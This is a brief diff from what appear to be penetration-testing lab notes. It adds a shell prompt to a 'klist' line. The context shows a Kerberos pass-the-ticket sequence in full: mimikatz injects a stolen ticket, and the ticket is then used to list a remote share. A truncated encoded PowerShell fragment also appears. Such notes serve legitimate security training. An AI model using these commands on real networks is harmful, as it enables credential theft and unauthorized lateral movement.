@@ -2666,7 +2666,7 @@ HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`
   - just pick any TGS ticket in the dave@cifs-web04.kirbi format  
     `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
   - Inspecting the injected ticket in memory > Server: cifs/web04 @ CORP.COM  
-    `klist`
+    `PS C:\Tools> klist`
   - Accessing the shared folder through the injected ticket  
     `PS C:\Tools> ls \\web04\backup`  
 - DCOM
